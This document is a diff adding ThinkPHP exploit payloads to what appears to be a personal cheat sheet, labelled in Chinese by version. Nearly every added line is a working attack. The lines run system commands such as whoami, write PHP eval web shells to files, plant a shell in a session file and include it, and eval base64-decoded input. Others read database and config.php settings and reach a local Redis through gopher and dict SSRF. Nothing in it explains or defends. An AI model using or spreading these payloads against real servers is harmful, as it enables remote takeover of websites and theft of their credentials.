@@ -7,6 +7,58 @@ Payload: ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]
 Payload: ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=shell.php&vars[1][1]=<?php eval($_REQUEST["a"]);?>
 
 
+?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
+
+
+1.
+POST /?s=captcha
+Cookie: PHPSESSID=kktest
+
+_method=__construct&filter[]=think\Session::set&method=get&get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&server[]=1
+
+2.
+POST /?s=captcha&r=cGhwaW5mbygpOw==
+
+_method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php
+
+
+
+
+_method=__construct&filter[]=system&method=GET&get[]=whoami
+
+?s=index/think\config/get&name=database.username 配置文件读取
+
+
+_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo     Content-Type: application/x-www-form-urlencoded
+
+_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=POST
+
+
+seesion包含getshell：
+_method=__construct&filter[]=think\Session::set&method=get&get[]=<?php eval(&_POST['x'])?>&server[]=1
+_method=__construct&method=get&filter[]=think\__include_file&get[]=tmp\sess_60e4723c6a9208e3238da6380982049b&server=1
+
+
+
+5.0.9
+_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
+s=file_put_contents(‘dd.php’,’<?php @eval($_POST[1]);’)&_method=__construct&method=POST&filter[]=assert
+
+
+
 thinkphp6.0漏洞
 /?a=a&b=123<php+phpinfo();+?>
 PHPSESSID=/../../..//public/a.php
+
+
+thinkphp5.0.24    --http://cn-sec.com/archives/77514.html
+/thinkphp/public/index.php?s=index/test/httpget&url=file:////var/www/html/thinkphp/application/config.php    配置文件读取
+/thinkphp/public/index.php?s=index/test/httpget&url=gopher://127.0.0.1:6379/_info   ssrf
+/thinkphp/public/index.php?s=index/test/httpget&url=dict://127.0.0.1:6379/info  ssrf
+
+
+
+
